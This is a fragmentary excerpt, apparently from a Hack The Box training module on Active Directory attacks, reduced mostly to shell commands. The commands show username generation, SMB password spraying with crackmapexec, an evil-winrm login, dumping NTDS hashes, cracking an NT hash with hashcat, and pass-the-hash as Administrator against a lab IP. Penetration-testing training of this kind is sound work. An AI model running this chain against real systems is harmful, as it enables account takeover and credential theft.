...
![AD Authentication](ADauthentication_diagram.webp)
...
```shell-session
frank-106@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
...
```shell-session
frank-106@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
...
![Eventlogs from the attack](events_dc.webp)
...
```shell-session
frank-106@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
...
```shell-session
frank-106@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
...
```shell-session
frank-106@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
...
```shell-session
frank-106@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
